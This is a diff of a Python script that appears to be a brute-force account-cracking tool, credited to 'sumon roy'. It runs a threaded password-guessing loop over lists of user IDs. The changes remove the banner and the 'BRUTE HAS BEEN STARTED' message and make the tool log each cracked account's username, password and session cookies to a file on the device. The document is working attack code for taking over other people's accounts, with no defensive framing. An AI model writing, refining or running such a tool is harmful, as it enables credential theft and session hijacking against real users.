@@ -36,16 +36,7 @@ except:pass
  
  
 ###-------[LOGO]-----------####
-logo= f'''\033[1;97m
-     Y88b   d88P Y88b   d88P 8888888888P 
-      Y88b d88P   Y88b d88P        d88P  
-       Y88o88P     Y88o88P        d88P   
-\033[1;32m        Y888P       Y888P        d88P
-        d888b        888        d88P\033[1;97m
-       d88888b       888       d88P      
-      d88P Y88b      888      d88P       
-     d88P   Y88b     888     d8888888888 
-     
+logo= f'''
 \033[1;97m---------------------------------------------------
  \033[1;97m[\033[1;92m•\033[1;97m] Author   : sumon roy
 \033[1;97m---------------------------------------------------
@@ -101,7 +92,7 @@ def random_number():
     with ThreadPoolExecutor(max_workers=30) as XYZ:
         clear()
         total_idz = str(len(idz))
-        print(f"\033[1;96m BRUTE HAS BEEN STARTED BE PATIENT")
+        print(f"\033[1;96m ")
         print()
         linex()
         print(f' \033[1;32m(√) \033[1;37mTotal IDs  :\033[1;32m ',total_idz)
@@ -187,13 +178,13 @@ def crack(uid, pww, total_idz):
                         return True
                    elif  json_response.get('auth_token'):
                         session_cookies = response.cookies.get_dict()
-                        print(f"\r\033[1;92m [CONG-OK] {uid} | {pw}")
+                        username = json_response.get('user', {}).get('username', 'Unknown')
+                        print(f"\r\033[1;92m [CONG-OK] {username} | {pw}")
                         print(f"\r\033[1;92m [cookie] {session_cookies}")
-                        open("/sdcard/XYZ/RANDOM_OK.txt", "a").write(f"{uid}|{pw}|{session_cookies}\n")
+                        open("/sdcard/XYZ/RANDOM_OK.txt", "a").write(f"{username}|{pw}|{session_cookies}\n")
                         oks.append(uid)
                         return True
             else:
-                print("Request failed with status code:", response.status_code)
                 continue
         loop+=1
     except ConnectionError:
